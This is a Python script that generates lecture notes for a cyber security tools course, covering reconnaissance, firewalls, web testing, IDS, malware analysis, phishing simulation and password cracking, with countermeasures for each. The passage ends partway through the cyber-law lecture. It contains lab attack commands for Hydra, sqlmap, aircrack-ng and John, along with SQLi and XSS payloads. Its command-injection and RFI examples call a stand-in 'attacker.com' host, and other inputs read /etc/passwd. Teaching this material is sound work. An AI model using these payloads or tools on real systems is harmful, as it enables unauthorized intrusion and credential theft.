#!/usr/bin/env python3
"""Generate Cyber Security Tools course lecture files."""
from pathlib import Path

BASE = Path("/workspace/courses/04-cyber-security-tools-ignou/notes")

LECTURES = {
    "vol-01": {
        "title": "Essentials, APT/Kill Chain, Firewalls",
        "range": "L1–L9",
        "lectures": [
            ("L01", "course-introduction-tool-landscape", "Course Introduction & Cyber Security Tool Landscape", [
                ("Overview", "Security tools are software utilities used to **detect**, **prevent**, **analyze**, or **respond to** cyber threats. This course maps tools to the BAOU PGDCS-103 blocks and hands-on lab workflows."),
                ("Tool categories", "| Category | Examples | Role |\n|----------|----------|------|\n| Reconnaissance | Nmap, theHarvester | Discover assets |\n| Scanning | Nikto, OpenVAS | Find vulnerabilities |\n| Exploitation | sqlmap, Hydra | Demonstrate impact (lab only) |\n| Defense | iptables, Snort, Windows Firewall | Block/detect attacks |\n| Analysis | Wireshark, strings | Inspect traffic/files |"),
                ("Lab setup steps", "1. Install VirtualBox or VMware.\n2. Download **Kali Linux** ISO from kali.org.\n3. Create two VMs on a **host-only network**: Kali (attacker) + Ubuntu/Metasploitable (target).\n4. Snapshot VMs before each lab.\n5. Verify connectivity: `ping <target-ip>` from Kali."),
                ("Countermeasures", "- Maintain asset inventory so unknown scanning is detectable.\n- Segment lab networks from production LANs.\n- Enforce **authorization** before any security testing.\n- Log and monitor VM host activity."),
            ]),
            ("L02", "cia-triad-risk-policies", "CIA Triad, Risk Assessment & Security Policies", [
                ("Purpose", "Establish the security foundation before tool usage. Aligns with PGDCS-101 Block 1 and Nina Godbole's risk-management chapters."),
                ("CIA triad", "- **Confidentiality** — encryption, access control\n- **Integrity** — hashing, change detection\n- **Availability** — redundancy, backups, DDoS mitigation"),
                ("Risk assessment steps", "1. Identify assets (data, systems, people).\n2. Identify threats and vulnerabilities.\n3. Estimate likelihood × impact → risk score.\n4. Select controls: avoid, transfer, mitigate, accept.\n5. Document in a **risk register**."),
                ("Policy vs procedure", "- **Policy** — what must be done (e.g., 'All passwords ≥ 12 characters').\n- **Procedure** — how to do it (e.g., Active Directory GPO steps)."),
                ("Countermeasures", "- Publish acceptable-use and password policies.\n- Conduct annual risk assessments.\n- Map controls to frameworks (ISO 27001, NIST)."),
            ]),
            ("L03", "nmap-netcat-discovery", "Network Discovery with Nmap & Netcat", [
                ("Nmap — purpose", "Network mapper for host discovery, port scanning, service/version detection, and OS fingerprinting."),
                ("Nmap — usage steps", "```bash\n# Host discovery (no port scan)\nnmap -sn 192.168.56.0/24\n\n# TCP SYN scan (requires root)\nnmap -sS -p- 192.168.56.101\n\n# Service + version detection\nnmap -sV -O 192.168.56.101\n\n# Safe script scan\nnmap --script safe 192.168.56.101\n```"),
                ("Netcat — purpose", "Swiss-army TCP/UDP tool for connectivity testing, banner grabbing, and simple file transfer."),
                ("Netcat — usage steps", "```bash\n# Listen on port 4444\nnc -lvnp 4444\n\n# Connect and grab banner\nnc -v 192.168.56.101 80\n\n# Port scan (basic)\nnc -zv 192.168.56.101 20-80\n```"),
                ("Countermeasures", "- Deploy IDS/IPS to detect SYN scans (`nmap -sS`).\n- Close unused ports; firewall by default-deny.\n- Use port knocking or jump hosts for admin access.\n- Rate-limit connection attempts (fail2ban)."),
            ]),
            ("L04", "wireshark-packet-analysis", "Packet Analysis with Wireshark", [
                ("Purpose", "Capture and decode network frames to troubleshoot issues and detect malicious traffic."),
                ("Usage steps", "1. Select the correct interface (e.g., `eth0`).\n2. Apply capture filter: `tcp port 80`.\n3. Start capture during a test (browse target web app).\n4. Stop capture; apply display filter: `http.request.method == \"GET\"`.\n5. Follow TCP stream to reconstruct sessions.\n6. Export objects or save PCAP for evidence."),
                ("Key display filters", "| Filter | Use |\n|--------|-----|\n| `ip.addr == 10.0.0.5` | Host traffic |\n| `tcp.flags.syn == 1` | SYN packets |\n| `dns` | DNS queries |\n| `tls.handshake.type == 1` | TLS ClientHello |"),
                ("Countermeasures", "- Encrypt traffic (TLS 1.2+) to limit passive disclosure.\n- Monitor for DNS tunneling and unusual protocols.\n- Store PCAPs securely with access controls.\n- Use encrypted management channels (SSH, not Telnet)."),
            ]),
            ("L05", "apt-kill-chain", "APT Lifecycle & Cyber Kill Chain", [
                ("Purpose", "Understand how advanced persistent threats progress through stages — maps offensive tools to defensive detection points."),
                ("Cyber Kill Chain (7 stages)", "1. **Reconnaissance** — OSINT, Nmap\n2. **Weaponization** — malware + exploit paired\n3. **Delivery** — phishing email, drive-by\n4. **Exploitation** — trigger vulnerability\n5. **Installation** — persistence, backdoor\n6. **Command & Control** — beacon to C2 server\n7. **Actions on Objectives** — data theft, destruction"),
                ("MITRE ATT&CK mapping", "Use [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) to map techniques (T1595 Recon, T1190 Exploit Public-Facing App) to tools covered in this course."),
                ("Lab exercise", "Given a phishing scenario, identify which Kill Chain stages are complete and which Snort/iptables rules would detect each stage."),
                ("Countermeasures", "- **Defense in depth** — block multiple stages.\n- Email filtering + user awareness (break delivery).\n- EDR for installation/C2 detection.\n- Network segmentation to limit lateral movement."),
            ]),
            ("L06", "threat-modeling-attack-surface", "Threat Modeling & Attack Surface Mapping", [
                ("Purpose", "Systematically identify threats before attackers do; prioritize which tools to deploy for testing."),
                ("STRIDE model", "| Threat | Example | Tool to test |\n|--------|---------|-------------|\n| Spoofing | Fake login page | Phishing sim |\n| Tampering | SQL injection | sqlmap |\n| Repudiation | Log deletion | auditd |\n| Info disclosure | Verbose errors | Nikto |\n| DoS | SYN flood | hping3 (lab) |\n| Elevation | SUID exploit | manual |"),
                ("Attack surface mapping steps", "1. Draw data-flow diagram (DFD).\n2. List entry points: web forms, APIs, Wi-Fi, USB.\n3. Assign trust boundaries.\n4. Apply STRIDE per component.\n5. Rank risks; schedule scans (OpenVAS, ZAP)."),
                ("Countermeasures", "- Reduce attack surface: disable unused services.\n- Apply least privilege.\n- Re-model after every architecture change.\n- Integrate threat modeling into SDLC."),
            ]),
            ("L07", "firewall-concepts", "Firewall Concepts — Stateful vs Stateless Filtering", [
                ("Purpose", "Firewalls enforce access control at network boundaries — foundation for iptables (L8) and Windows Firewall (L9)."),
                ("Types", "- **Packet-filtering** — examines headers (IP, port); stateless.\n- **Stateful** — tracks connection state; allows return traffic automatically.\n- **Application-layer (proxy)** — inspects HTTP/DNS content.\n- **Next-gen (NGFW)** — IPS, app awareness, threat intel."),
                ("Rule design principles", "1. **Default deny** — block all, allow explicitly.\n2. **Least privilege** — minimum ports/services.\n3. **Document** every rule with owner and expiry.\n4. Test rules in staging before production."),
                ("Countermeasures", "- Place firewalls at trust boundaries (DMZ, internal segments).\n- Log denied packets; alert on spikes.\n- Combine with IDS (Snort) for deep inspection.\n- Review rules quarterly; remove orphans."),
            ]),
            ("L08", "iptables-ufw", "Linux Packet Filtering with iptables & UFW", [
                ("iptables — purpose", "Linux kernel netfilter framework for packet filtering, NAT, and mangling."),
                ("iptables — usage steps", "```bash\n# View current rules\nsudo iptables -L -v -n\n\n# Default deny incoming\nsudo iptables -P INPUT DROP\nsudo iptables -P FORWARD DROP\nsudo iptables -P OUTPUT ACCEPT\n\n# Allow established connections\nsudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# Allow SSH from lab subnet\nsudo iptables -A INPUT -p tcp -s 192.168.56.0/24 --dport 22 -j ACCEPT\n\n# Allow HTTP/HTTPS\nsudo iptables -A INPUT -p tcp --dport 80,443 -j ACCEPT\n\n# Log then drop everything else\nsudo iptables -A INPUT -j LOG --log-prefix \"IPTABLES-DROP: \"\nsudo iptables -A INPUT -j DROP\n\n# Save rules (Debian/Ubuntu)\nsudo apt install iptables-persistent\nsudo netfilter-persistent save\n```"),
                ("UFW — simplified frontend", "```bash\nsudo ufw default deny incoming\nsudo ufw allow from 192.168.56.0/24 to any port 22\nsudo ufw allow 80,443/tcp\nsudo ufw enable\nsudo ufw status verbose\n```"),
                ("Countermeasures", "- Automate rule deployment (Ansible, Puppet).\n- Never expose management ports to the internet.\n- Test with `nmap` after rule changes.\n- Monitor `/var/log/kern.log` for DROP entries."),
            ]),
            ("L09", "windows-firewall", "Windows Firewall & Host-Based Perimeter Defense", [
                ("Purpose", "Windows Defender Firewall provides host-level inbound/outbound filtering on Windows workstations and servers."),
                ("PowerShell usage steps", "```powershell\n# Check status\nGet-NetFirewallProfile | Select Name, Enabled\n\n# Block inbound by default (Domain profile)\nSet-NetFirewallProfile -Profile Domain -DefaultInboundAction Block\n\n# Allow RDP from lab subnet only\nNew-NetFirewallRule -DisplayName \"Lab RDP\" `\n  -Direction Inbound -Protocol TCP -LocalPort 3389 `\n  -RemoteAddress 192.168.56.0/24 -Action Allow\n\n# Block outbound SMB to internet\nNew-NetFirewallRule -DisplayName \"Block SMB Out\" `\n  -Direction Outbound -Protocol TCP -RemotePort 445 `\n  -RemoteAddress Internet -Action Block\n\n# List rules\nGet-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'}\n```"),
                ("GUI steps", "1. `wf.msc` → Windows Defender Firewall with Advanced Security.\n2. Inbound Rules → New Rule → Port/Program/Custom.\n3. Assign profile (Domain, Private, Public).\n4. Enable logging: Properties → Customize → Log dropped packets."),
                ("Countermeasures", "- Enforce GPO-managed firewall rules in AD environments.\n- Combine with Defender ATP/EDR.\n- Disable unnecessary services (SMBv1, Telnet).\n- Audit rule changes via Windows Event Log (4946, 4947)."),
            ]),
        ],
    },
    "vol-02": {
        "title": "Wireless, Web Scanning, App Inspection",
        "range": "L10–L18",
        "lectures": [
            ("L10", "wireless-reconnaissance", "Wireless Reconnaissance & Monitoring", [
                ("Purpose", "Discover Wi-Fi networks, clients, and security configurations using passive and active wireless monitoring."),
                ("Tools", "- **iwconfig / iw** — interface configuration\n- **Airodump-ng** — capture 802.11 frames\n- **Kismet** — wireless IDS"),
                ("Usage steps", "```bash\n# Enable monitor mode\nsudo airmon-ng check kill\nsudo airmon-ng start wlan0\n\n# Scan all channels\nsudo airodump-ng wlan0mon\n\n# Target specific BSSID + channel\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n```"),
                ("Countermeasures", "- Use **WPA3** or WPA2-Enterprise (802.1X).\n- Hide SSID is not security — rely on strong PSK/passphrase.\n- Deploy WIDS (wireless IDS).\n- Disable legacy protocols (WEP, WPA-TKIP)."),
            ]),
            ("L11", "wpa-security-assessment", "WPA/WPA2 Security Assessment", [
                ("Purpose", "Assess Wi-Fi authentication strength by capturing handshakes and testing passphrase entropy (authorized lab only)."),
                ("Aircrack-ng — usage steps", "```bash\n# Deauth to force handshake (lab AP only)\nsudo aireplay-ng -0 5 -a <AP_BSSID> wlan0mon\n\n# Crack captured handshake\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap\n```"),
                ("hashcat alternative", "```bash\n# Convert cap to hashcat format\ncap2hccapx capture-01.cap output.hccapx\nhashcat -m 2500 output.hccapx rockyou.txt\n```"),
                ("Countermeasures", "- Use passphrases ≥ 20 random characters.\n- Enable **PMF** (802.11w) where supported.\n- Rate-limit authentication attempts.\n- Monitor for deauth floods (deauth attack detection)."),
            ]),
            ("L12", "nikto-web-scanning", "Web Server Scanning with Nikto", [
                ("Purpose", "Open-source web server scanner that identifies outdated software, dangerous files, and misconfigurations."),
                ("Usage steps", "```bash\n# Basic scan\nnikto -h http://192.168.56.101\n\n# Scan specific port + SSL\nnikto -h 192.168.56.101 -p 443 -ssl\n\n# Save report\nnikto -h http://target -o report.html -Format html\n\n# Tune scan (evade IDS)\nnikto -h http://target -Tuning 123456789\n```"),
                ("Common findings", "- Default files (`/admin`, `/phpinfo.php`)\n- Outdated Apache/IIS versions\n- HTTP methods enabled (PUT, TRACE)\n- Missing security headers"),
                ("Countermeasures", "- Remove default pages and sample apps.\n- Keep web server patched.\n- Disable dangerous HTTP methods.\n- Add security headers (CSP, X-Frame-Options).\n- Rate-limit scanner traffic at WAF."),
            ]),
            ("L13", "zap-passive-scanning", "OWASP ZAP — Installation & Passive Scanning", [
                ("Purpose", "OWASP Zed Attack Proxy (ZAP) is a free web app security scanner and intercepting proxy."),
                ("Installation", "```bash\n# Kali: pre-installed; verify with\nzaproxy --version\n# Or download from zaproxy.org\n```"),
                ("Passive scan steps", "1. Launch ZAP → create new session.\n2. Set target URL: `http://192.168.56.101/dvwa`.\n3. Configure browser proxy: `127.0.0.1:8080`.\n4. Browse the application manually.\n5. Review **Alerts** tab for passive findings (missing headers, cookie flags).\n6. Export report: Report → Generate HTML."),
                ("Countermeasures", "- Fix all passive findings before active testing.\n- Set `HttpOnly` and `Secure` on session cookies.\n- Implement Content-Security-Policy.\n- Run ZAP in CI/CD pipeline (baseline scan)."),
            ]),
            ("L14", "zap-active-scanning", "ZAP Active Scanning & Proxy Interception", [
                ("Purpose", "Actively probe web apps for injection flaws, XSS, and misconfigurations."),
                ("Active scan steps", "1. Spider the target (Automated Scan → Spider).\n2. Run **Active Scan** on discovered URLs.\n3. Intercept requests: Break tab → modify parameters.\n4. Replay with Fuzzer: right-click → Attack → Fuzz.\n5. Review risk levels (High/Medium/Low/Info)."),
                ("Manual interception", "```\n# Example: modify POST parameter via ZAP proxy\n# Original: id=1\n# Modified: id=1' OR '1'='1\n# Observe server response for SQL errors\n```"),
                ("Countermeasures", "- Input validation and parameterized queries.\n- WAF with virtual patching.\n- Disable verbose error messages in production.\n- Scope active scans to authorized URLs only."),
            ]),
            ("L15", "content-discovery", "Directory & Content Discovery", [
                ("Purpose", "Find hidden directories, backup files, and admin panels not linked in the application."),
                ("Gobuster — usage steps", "```bash\n# Directory brute-force\ngobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak\n\n# DNS subdomain enumeration\ngobuster dns -d example.com -w subdomains.txt\n\n# ffuf (fast alternative)\nffuf -u http://target/FUZZ -w common.txt -fc 404\n```"),
                ("dirb usage", "```bash\ndirb http://192.168.56.101 /usr/share/dirb/wordlists/common.txt\n```"),
                ("Countermeasures", "- Remove backup files from web roots.\n- Return consistent 404 pages (no size differences).\n- Require authentication for admin paths.\n- Monitor for enumeration patterns (many 404s from one IP)."),
            ]),
            ("L16", "sql-injection-manual", "SQL Injection Fundamentals & Manual Testing", [
                ("Purpose", "SQL injection (SQLi) inserts malicious SQL via unsanitized input — manual testing confirms exploitability before automation."),
                ("Manual testing steps", "1. Identify input points: `?id=1`, login forms, search boxes.\n2. Test with payloads:\n   - `' OR '1'='1`\n   - `1' ORDER BY 5--`\n   - `1 UNION SELECT null,username,password FROM users--`\n3. Observe errors, behavior changes, timing delays.\n4. Classify: in-band, blind (boolean/time), out-of-band."),
                ("DVWA lab", "```\n# Low security: http://target/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\n# Escalate through DVWA security levels\n```"),
                ("Countermeasures", "- **Parameterized queries / prepared statements** (primary fix).\n- ORM with bound parameters.\n- Least-privilege DB accounts (no FILE/SHUTDOWN).\n- WAF as secondary layer; not a substitute for secure coding."),
            ]),
            ("L17", "sqlmap-automation", "Automated SQL Injection with sqlmap", [
                ("Purpose", "sqlmap automates detection and exploitation of SQL injection vulnerabilities."),
                ("Usage steps", "```bash\n# Test URL parameter\nsqlmap -u \"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"security=low; PHPSESSID=xxx\"\n\n# Enumerate databases\nsqlmap -u <url> --dbs\n\n# Dump table\nsqlmap -u <url> -D dvwa -T users --dump\n\n# POST request from file\nsqlmap -r request.txt --batch\n\n# Risk/level tuning\nsqlmap -u <url> --level=3 --risk=2\n```"),
                ("Safety", "- Use `--batch` for non-interactive labs.\n- Never run against production without written authorization.\n- `--tamper` scripts for WAF evasion (awareness only)."),
                ("Countermeasures", "- Same as L16: parameterized queries.\n- Block sqlmap User-Agent signatures at WAF.\n- Monitor for UNION/SELECT patterns in query strings.\n- Deploy database activity monitoring (DAM)."),
            ]),
            ("L18", "xss-client-side-attacks", "Cross-Site Scripting (XSS) & Client-Side Attacks", [
                ("Purpose", "XSS injects malicious scripts into pages viewed by other users — stored, reflected, and DOM-based variants."),
                ("Manual testing payloads", "```html\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n\"><svg onload=alert(1)>\n```"),
                ("ZAP detection", "1. Active scan flags XSS automatically.\n2. Manual: submit payloads in every input field.\n3. Check if payload appears unencoded in response."),
                ("BeEF (awareness)", "Browser Exploitation Framework hooks browsers post-XSS — demonstrates impact of session hijacking via client-side execution."),
                ("Countermeasures", "- **Output encoding** (HTML, JS, URL context-aware).\n- Content-Security-Policy: `default-src 'self'`.\n- HttpOnly cookies prevent JavaScript access.\n- Sanitize HTML with allowlist libraries (DOMPurify)."),
            ]),
        ],
    },
    "vol-03": {
        "title": "Web Attacks, IDS, Assurance, Malware",
        "range": "L19–L27",
        "lectures": [
            ("L19", "server-side-attacks", "Command Injection, LFI/RFI & Server-Side Attacks", [
                ("Purpose", "Server-side injection flaws let attackers execute OS commands or include arbitrary files."),
                ("Command injection testing", "```bash\n# Test inputs with:\n; whoami\n| id\n`cat /etc/passwd`\n$(curl attacker.com)\n```"),
                ("LFI/RFI testing", "```\n# Local File Inclusion\n?page=../../../../etc/passwd\n?page=php://filter/convert.base64-encode/resource=index.php\n\n# Remote File Inclusion (rare today)\n?page=http://attacker.com/shell.txt\n```"),
                ("ZAP testing", "Use Fuzzer on file parameters; check Active Scan alerts for Path Traversal."),
                ("Countermeasures", "- Never pass user input to shell (`exec`, `system`).\n- Use allowlists for file paths.\n- Disable `allow_url_include` in PHP.\n- Run web server as low-privilege user; chroot/containers."),
            ]),
            ("L20", "session-csrf-auth", "Session Management, CSRF & Authentication Flaws", [
                ("Purpose", "Weak session handling and missing CSRF tokens enable account takeover and unauthorized actions."),
                ("Testing steps", "1. Check cookie flags: `Secure`, `HttpOnly`, `SameSite`.\n2. Test session fixation: login without accepting new session ID.\n3. CSRF: create HTML form posting to state-changing endpoint.\n4. Test password reset flow for token predictability."),
                ("ZAP CSRF check", "Active scan → look for 'Absence of Anti-CSRF Tokens' alerts."),
                ("Countermeasures", "- Generate cryptographically random session IDs.\n- Rotate session ID on login.\n- Implement CSRF tokens on all state-changing requests.\n- Enforce MFA for sensitive operations.\n- Set `SameSite=Strict` or `Lax` on cookies."),
            ]),
            ("L21", "snort-ids", "Intrusion Detection with Snort", [
                ("Purpose", "Snort is an open-source network IDS/IPS that matches traffic against rule-based signatures."),
                ("Installation (Ubuntu)", "```bash\nsudo apt install snort\n# Or Snort 3 from source: docs.snort.org\n```"),
                ("Usage steps", "```bash\n# Test configuration\nsudo snort -T -c /etc/snort/snort.conf\n\n# IDS mode (alert only)\nsudo snort -A console -c /etc/snort/snort.conf -i eth0\n\n# Custom rule example\nalert tcp any any -> $HOME_NET 80 (msg:\"SQL Injection Attempt\"; \\\n  content:\"UNION\"; content:\"SELECT\"; sid:1000001;)\n\n# Log to unified2\nsudo snort -c /etc/snort/snort.conf -i eth0 -l /var/log/snort\n```"),
                ("Countermeasures (attacker evasion awareness)", "- Fragmentation, encoding, encryption bypass signature IDS.\n- Defenders: combine Snort with anomaly detection, TLS inspection (where legal).\n- Keep rules updated: `sudo snort-update` / PulledPork.\n- Tune rules to reduce false positives."),
            ]),
            ("L22", "ids-tuning-ips", "IDS Tuning, IPS Mode & Log Analysis", [
                ("Purpose", "Operationalize IDS — reduce false positives, enable inline blocking, correlate alerts."),
                ("Snort IPS (inline) mode", "```bash\n# Requires inline network tap or bridge\nsudo snort -Q --daq afpacket -c /etc/snort/snort.conf -i eth0:eth1\n```"),
                ("Suricata alternative", "```bash\nsudo apt install suricata\nsudo suricatasc -c ruleset-reload-rules\nsudo tail -f /var/log/suricata/fast.log\n```"),
                ("Tuning steps", "1. Baseline normal traffic for 48 hours.\n2. Suppress noisy rules (e.g., ICMP ping).\n3. Create custom rules for critical assets.\n4. Integrate with SIEM (Splunk, ELK, Wazuh).\n5. Define escalation playbooks per alert category."),
                ("Countermeasures", "- Defense: encrypted C2 is hard to signature-detect — use behavioral analytics.\n- Regular purple-team exercises to validate detection coverage.\n- Document every suppressed rule with justification."),
            ]),
            ("L23", "openvas-scanning", "Vulnerability Scanning with OpenVAS/GVM", [
                ("Purpose", "OpenVAS (Greenbone Vulnerability Manager) performs authenticated and unauthenticated network vulnerability scans."),
                ("Usage steps", "1. Install GVM: `sudo apt install gvm` → `sudo gvm-setup`.\n2. Access web UI: `https://127.0.0.1:9392`.\n3. Create target (IP/host list).\n4. Create task with scan config (Full and fast / Full and deep).\n5. Launch scan; review results by severity.\n6. Export PDF/CSV report for remediation tracking."),
                ("CLI (openvas-cli)", "```bash\nomp -u admin -w password --xml='<get_reports/>'\n```"),
                ("Countermeasures", "- Patch or mitigate every Critical/High finding.\n- Schedule monthly scans; continuous with Greenbone Enterprise.\n- Use credentialed scans for accurate patch status.\n- Validate fixes with re-scan."),
            ]),
            ("L24", "cvss-prioritization", "CVSS Scoring & Vulnerability Prioritization", [
                ("Purpose", "Common Vulnerability Scoring System (CVSS) provides standardized severity ratings for triage."),
                ("CVSS v3.1 metrics", "- **Base:** Attack Vector, Complexity, Privileges, User Interaction, Scope, Impact (C/I/A)\n- **Temporal:** Exploit maturity, remediation level\n- **Environmental:** asset-specific modifiers"),
                ("Scoring steps", "1. Obtain CVE and NVD entry.\n2. Calculate base score (use NVD calculator).\n3. Apply environmental score for your asset criticality.\n4. Prioritize: Critical (9.0–10.0) → immediate; Low (0.1–3.9) → scheduled."),
                ("Calculator", "https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator"),
                ("Countermeasures", "- Don't chase volume — prioritize by exploitability + asset value.\n- Track mean time to remediate (MTTR) by severity.\n- Integrate CVSS with ticketing (Jira, ServiceNow)."),
            ]),
            ("L25", "security-assurance", "Security Assurance — Frameworks, Audits & Compliance", [
                ("Purpose", "Assurance demonstrates that controls are designed and operating effectively — PGDCS-103 Block 2, Unit 1."),
                ("Key frameworks", "| Framework | Focus |\n|-----------|-------|\n| ISO 27001 | ISMS certification |\n| NIST CSF | Identify, Protect, Detect, Respond, Recover |\n| CIS Controls | Prioritized technical safeguards |\n| COBIT | IT governance |"),
                ("Audit steps", "1. Define scope and criteria.\n2. Collect evidence (policies, logs, scan reports).\n3. Interview process owners.\n4. Test controls (sample access reviews).\n5. Report findings with risk ratings.\n6. Track remediation to closure."),
                ("Countermeasures", "- Maintain evidence repository (policy version control).\n- Automate compliance checks (InSpec, OpenSCAP).\n- Annual external audit for certification.\n- Reference Nina Godbole Ch. on metrics and frameworks."),
            ]),
            ("L26", "malware-static-analysis", "Malware Taxonomy & Static Analysis", [
                ("Purpose", "Classify malware and examine binaries without execution — PGDCS-103 Block 2, Unit 2."),
                ("Malware types", "Virus, worm, trojan, ransomware, rootkit, spyware, adware, fileless malware."),
                ("Static analysis tools", "```bash\n# File identification\nfile suspicious.exe\nmd5sum suspicious.exe   # hash for VirusTotal lookup\n\n# Strings extraction\nstrings suspicious.exe | less\n\n# PE analysis (Windows)\nobjdump -x suspicious.exe\npeframe suspicious.exe\n\n# ClamAV scan\nclamscan -r /path/to/samples/\n```"),
                ("Countermeasures", "- Block known hashes at endpoint (EDR).\n- Application allowlisting.\n- Email attachment sandboxing.\n- User awareness — don't open unknown attachments."),
            ]),
            ("L27", "malware-dynamic-analysis", "Dynamic Malware Analysis & Sandboxing", [
                ("Purpose", "Execute malware in isolated environment to observe behavior — network callbacks, file changes, registry keys."),
                ("Sandbox steps", "1. Prepare isolated VM (no network or simulated net).\n2. Take snapshot.\n3. Execute sample.\n4. Monitor: Process Monitor, Wireshark, Regshot.\n5. Revert snapshot.\n6. Document IOCs (IPs, domains, file paths)."),
                ("Tools", "- **Cuckoo Sandbox** — automated analysis\n- **ANY.RUN** — interactive cloud sandbox\n- **Procmon + Wireshark** — manual analysis"),
                ("Countermeasures", "- Block C2 domains at DNS/firewall (threat intel feeds).\n- Behavioral detection (AMS/EDR).\n- Network segmentation limits lateral spread.\n- Report IOCs to CERT-In for national coordination."),
            ]),
        ],
    },
    "vol-04": {
        "title": "E-Commerce, Social Engineering, Cyber Law",
        "range": "L28–L36",
        "lectures": [
            ("L28", "ecommerce-tls", "E-Commerce Security & TLS/SSL Configuration", [
                ("Purpose", "E-commerce depends on transport encryption and secure certificate management — PGDCS-103 Block 2, Unit 3."),
                ("OpenSSL — usage steps", "```bash\n# Check certificate\necho | openssl s_client -connect shop.example.com:443 2>/dev/null | openssl x509 -noout -dates -subject\n\n# Test TLS configuration\ntestssl.sh https://shop.example.com\n\n# Generate self-signed (lab)\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n```"),
                ("TLS best practices", "- TLS 1.2 minimum; prefer TLS 1.3.\n- Strong cipher suites (AEAD: AES-GCM, ChaCha20).\n- HSTS header: `Strict-Transport-Security: max-age=31536000`.\n- Certificate transparency monitoring."),
                ("Countermeasures", "- Auto-renew certs (Let's Encrypt, cert-manager).\n- Disable SSLv3, TLS 1.0/1.1.\n- Implement OCSP stapling.\n- Monitor for cert expiry (30-day alerts)."),
            ]),
            ("L29", "pci-payment-security", "Payment Security, PCI-DSS & Web Hardening", [
                ("Purpose", "PCI-DSS mandates controls for organizations handling cardholder data."),
                ("PCI-DSS key requirements", "1. Install and maintain firewall.\n2. No default passwords.\n3. Protect stored cardholder data.\n4. Encrypt transmission.\n5. Use and update antivirus.\n6. Develop secure systems.\n7. Restrict data access.\n8. Unique IDs for each person.\n9. Restrict physical access.\n10. Track and monitor network access.\n11. Regularly test security.\n12. Maintain information security policy."),
                ("ZAP for e-commerce", "```bash\n# Scan checkout flow\nzap-cli quick-scan --self-contained http://shop.lab/checkout\n# Check for: mixed content, missing headers, injection in payment fields\n```"),
                ("Countermeasures", "- Tokenize card data (use payment gateway — never store PAN).\n- SAQ (Self-Assessment Questionnaire) compliance.\n- Quarterly ASV scans (OpenVAS qualified).\n- Segregate CDE (Cardholder Data Environment)."),
            ]),
            ("L30", "social-engineering-set", "Social Engineering Toolkit & Phishing Simulation", [
                ("Purpose", "Social engineering exploits human psychology — PGDCS-103 Block 2, Unit 4. SET automates phishing and payload delivery in labs."),
                ("SET — usage steps", "```bash\nsudo setoolkit\n# Menu: 1) Social-Engineering Attacks\n#        2) Website Attack Vectors\n#        3) Credential Harvester Attack Method\n#        2) Site Cloner — clone login page\n```"),
                ("Gophish (alternative)", "1. Install Gophish.\n2. Create email template + landing page.\n3. Import target group.\n4. Launch campaign; track click/submit rates.\n5. Use results for awareness training."),
                ("Countermeasures", "- Security awareness training (quarterly).\n- Phishing reporting button.\n- DMARC/DKIM/SPF for email authentication.\n- MFA on all external-facing logins.\n- Never punish users who report — encourage reporting."),
            ]),
            ("L31", "osint-human-factor", "OSINT & Human-Factor Countermeasures", [
                ("Purpose", "Open-Source Intelligence gathering demonstrates information leakage before technical attacks."),
                ("theHarvester — usage steps", "```bash\ntheHarvester -d example.com -b google,bing,linkedin\n# Collects: emails, subdomains, hosts\n```"),
                ("Other OSINT sources", "- Shodan, Censys — exposed services\n- WHOIS / DNS records\n- Social media profiles\n- Paste sites (breach data)"),
                ("Countermeasures", "- Minimize public footprint (OPSEC).\n- Separate personal and corporate social media.\n- Data classification and handling procedures.\n- Red-team OSINT exercises to find leaks.\n- Privacy settings on all platforms."),
            ]),
            ("L32", "john-the-ripper", "Password Attacks with John the Ripper", [
                ("Purpose", "John the Ripper (JtR) cracks password hashes offline — demonstrates why strong hashing matters."),
                ("Usage steps", "```bash\n# Identify hash format\njohn --list=formats --format=crypt\n\n# Crack /etc/shadow entries (lab)\nunshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt combined.txt\n\n# Show cracked passwords\njohn --show combined.txt\n\n# Specific format\njohn --format=md5crypt combined.txt\n```"),
                ("Hash extraction (awareness)", "```bash\n# From Windows SAM (lab)\n# mimikatz or samdump2 — authorized forensics only\n```"),
                ("Countermeasures", "- Store passwords with **bcrypt**, **scrypt**, or **Argon2** — never MD5/SHA1.\n- Enforce password complexity + length (≥ 12 chars).\n- Implement account lockout / rate limiting.\n- Deploy MFA everywhere.\n- Use password managers."),
            ]),
            ("L33", "hydra-brute-force", "Network Login Attacks with Hydra & Defense", [
                ("Purpose", "THC-Hydra performs parallelized login brute-forcing against network services."),
                ("Usage steps", "```bash\n# SSH brute-force (lab)\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101\n\n# HTTP POST form\nhydra -l admin -P passwords.txt 192.168.56.101 http-post-form \\\n  \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"\n\n# FTP\nhydra -L users.txt -P passwords.txt ftp://192.168.56.101\n\n# Limit threads (avoid DoS)\nhydra -t 4 -w 30 ...\n```"),
                ("fail2ban defense", "```bash\n# /etc/fail2ban/jail.local\n[sshd]\nenabled = true\nmaxretry = 3\nbantime = 3600\n```"),
                ("Countermeasures", "- Disable password auth for SSH; use key-based auth.\n- CAPTCHA after N failed logins.\n- fail2ban / CrowdStrike / WAF rate limiting.\n- Monitor authentication logs (auth.log, Event 4625)."),
            ]),
            ("L34", "cyber-law-india", "IT Act 2000 & Indian Cyber Law Essentials", [
                ("Purpose", "Legal framework governing cybercrime in India — Nina Godbole, *Cyber Security*, legal perspectives chapter."),
                ("Key IT Act sections", "| Section | Offence |\n|---------|--------|\n| 43 | Unauthorized access, damage (civil compensation) |\n| 66 | Computer-related offences (criminal) |\n| 66C | Identity theft |\n| 66D | Cheating by personation (phishing) |\n| 66E | Violation of privacy (image capture) |\n| 66F | Cyber terrorism |\n| 67 | Publishing obscene material |\n| 69 | Govt. interception powers |\n| 72 | Breach of confidentiality |"),
